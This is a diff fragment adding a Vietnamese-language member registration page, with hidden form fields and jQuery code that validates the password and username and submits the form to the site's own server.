+                                onclick="showTnC()"></br>điều khoản hội viên</span></div>
+                    </div>
+                </div>
+                <input type="button" value="Xác nhận" class="btn_SentOut tempBtn"
+                    onclick="fnSubmitAdd1P2(); return false;" />
+            </div>
+            <input type="hidden" value="0" id="checkSliderType" class="checkSliderType" />
+            <input type="hidden" name="hidTempAgent" id="hidTempAgent" value="A51" /><input type="hidden"
+                name="hidTempAccounts" id="hidTempAccounts" /><input type="hidden" name="hid_f_isPhoneMsg"
+                id="hid_f_isPhoneMsg" /><input type="hidden" name="hidIsFromAgent" id="hidIsFromAgent" value="0" />
+        </div>
+
+
+    </form>
+    <script type="text/javascript" src="/Scripts/lang.76072610cddda427.js"></script>
+    <script type="text/javascript" src="/Scripts/main.6a34a4f1c4eef7e5.js"></script>
+    <script type="text/javascript" src="/Scripts/layer/layer.7133d392c3ae01bd.js"></script>
+    <script type="text/javascript" src="/Scripts/dateRelation.d5fcbbad6cd684a4.js"></script>
+    <script type="text/javascript" src="/Scripts/common/add_jh.a9dbec030117704a.js"></script>
+
+    <script type="text/javascript">
+        var Agent1 = "A51";//判断代理
+        var ddl1 = false;
+        var IsJudgePhone = IsTrue("True");
+        var site = "5";
+        var submitFlag = false;
+
+        $(function () {
+            if (IsJudgePhone) {
+                $(".btn_SentOut").attr("disabled", "disabled");
+            }
+            layerResetSize(100);
+            fnOn("#f_isPhoneMsg,#ckb1");//点击切换样式
+            //绑定TXT输入
+            fnBindTitleOn($('#txtTitle'));
+            $("#ddlAccounts").click(function () {
+                ddl1 = true;
+            });
+            $("#txtPassword").on("keydown", function (e) {
+                var txt = $(this).val();
+                if (txt.length >= 10 && ((e.which >= 48 && e.which <= 57) || (e.which >= 65 && e.which <= 90) || (e.which >= 96 && e.which <= 111) || (e.which >= 186 && e.which <= 192) || (e.which >= 219 && e.which <= 222) || e.which == 229)) {
+                    $('#formPrompt').show();
+                }
+                else {
+                    $('#formPrompt').hide();
+                }
+            });
+            $("#txtPassword").on("keyup change", function () {
+                checkRegeditUser2(this, 5);
+                var txt = $(this).val();
+                $(this).removeClass("inputred");
+                if (txt !== "") {
+                    if (txt.length > 10) {
+                        $('#formPrompt').show();
+                        txt = txt.substr(0, 10);
+                        $(this).val(txt);
+                    }
+                    if (pdPass(txt)) {
+                        showTip(true);
+                    } else {
+                        showTip(false);
+                    }
+                } else {
+                    $(this).removeClass("inputred");
+                    $("#txtPassword_tip").hide();
+                    $('#formPrompt').hide();
+                }
+                layer.close(layerTipsIndex1);
+            });
+            $("#txtPassword").blur(function () {
+                checkRegeditUser2(this, 5);
+                var txt = $(this).val();
+                if (txt === "") {
+                    $(this).removeClass("inputred");
+                    $("#txtPassword_tip").hide();
+                    $('#formPrompt').hide();
+                } else {
+                    if (pdPass(txt)) { fn_AccountIsSamePwd(); }
+                    if (txt.length >= 10) {
+                        $(this).val(txt.substr(0, 10));
+                        showTip(true);
+                        $('#formPrompt').hide();
+                    }
+                }
+            });
+            $("#txtAccounts").on("input keyup afterpaste", function () {
+                if ($.cookie("UserNameBlurName_" + site)) {
+                    $.cookie("UserNameBlurName_" + site, "");
+                    $("#checkSliderType").val("0");
+                }
+            });
+            $("#txtAccounts").on("blur focus", function (event) {
+                checkAccounts(this);
+                if ($.cookie("UserNameBlurName_" + site) != $("#txtAccounts").val()) {
+                    setTimeout(function () {
+                        if ($(".layui-layer-dialog").length <= 0) {
+                            $.ajax({
+                                url: "/LoadData/AddMemberCheck.ashx",
+                                type: "post",
+                                data: { "checkType": "checkBlurCount2" },
+                                cache: false,
+                                timeout: 15000,
+                                error: function () {
+                                },
+                                success: function (msg) {
+                                    if (parseInt(msg) < 2) {
+                                        $.cookie("UserNameBlurName_" + site, $("#txtAccounts").val());
+                                    }
+                                }
+                            });
+                        }
+                    }, 200);
+                }
+                else {
+                    if ($(this).val() != "") {
+                        var e = event || window.event || arguments.callee.caller.arguments[0];
+                        if (event.type == "blur") {
+                            setTimeout(function () {
+                                validateUserName();
+                            }, 500)
+                        }
+                    }
+                }
+            });
+            $("#txtAgent,#txtPhoto,#txtPhotoYn").on("input keyup keypress afterpaste blur focus", function (event) {
+                var filter = /\s/g;
+                if (filter.test($(this).val())) {
+                    var txtp = $(this).val().replace(filter, "");
+                    $(this).val(txtp);
+                }
+            });
+            document.onkeydown = function (event) {
+                var e = event || window.event || arguments.callee.caller.arguments[0];
+                if (e && e.keyCode == 13) { // enter 
+                    if ($("#captchaModal").is(":visible")) {
+                        return false;
+                    }
+                    if ($(".layui-layer-shade").size() > 0) {
+                        return;
+                    }
+                    $("input:focus").blur();
+                    fnSubmitAdd1P2();
+                    return false;
+                }
+            };
+            initAdd1();
+            if (isContactCSFlag) {
+                showMsgP2(5)
+            }
+        });
+        //帐号密码
+        function showTip(flag) {
+            if (flag) {
+                $("#txtimg").css({ "background-position": "0 -48px" });
+            } else {
+                $("#txtimg").css({ "background-position": "0 -70px" });
+            }
+            $("#txtPassword_tip").show();
+        }
+        function showTnC() {
+            setTimeout(function () {
+                if ($("#captchaModal").css("display") != "block") {
+                    openNewWindowAutoHeight('/Aspx/Add.aspx', 860, 570)
+                }
+            }, 700)
+        }
+        function fnSubmitAdd1_click() {
+            if (submitFlag) {
+                return;
+            }
+            else {
+
+                var str = $("#form1").serialize();
+                str += "&type=submit";
+                submitFlag = true;
+                $.fn.loading();
+                $.ajax({
+                    url: "Add1.aspx",
+                    data: str,
+                    type: "post",
+                    cache: false,
+                    timeout: 15000,
+                    error: function (e) {
+                        submitFlag = false;
+                        $.fn.closeloading();
+                        if (e.status == 599 || e.status == 429) {
+                            $.fn.alert(webRes.Font_Register_IPBlocked + "！！<br>" + e.responseText.replace('blocked ', ''));
+                        } else {
+                            $.fn.alert('Giao diện xảy ra lỗi, vui lòng liên hệ hỗ trợ！！');
+                        }
+                    },
+                    success: function (data) {
+                        $.fn.closeloading();
+                        if (data === "1") {
+                            fnLayerStyle(500, 330);//固定高度
+                            parent.UserFirstLogin($("#hidTempAccounts").val().trim(), parent.SetHMACMD5($("#txtPassword").val().trim()));
+                            parent.registerSuccessOpenDepositArea();
+                            layerframeAddClose();
+                        } else if (data.indexOf(webRes.Font_RegisterCloseMsg) > -1) {
+                            $.fn.alert(data, function () {
+                                layerframeAddClose();
+                            });
+                        } else if (data == webRes.Font_LoginDomainBlocked) {
+                            $.fn.alert(webRes.Font_LoginDomainBlocked, function () {
+                                layerframeAddClose();
+                            });
+                        } else if (data.indexOf(webRes.Font_ReferralNotValid) > -1) {
+                            $.fn.alert(data, function () {
+                                layerframeAddClose();
+                            });
+                        } else {
+                            $.fn.alert(data);
+                        }
+                        submitFlag = false;
+                    }
+                });
+            }
+        }
+    </script>
+
+</body>
+
+</html>
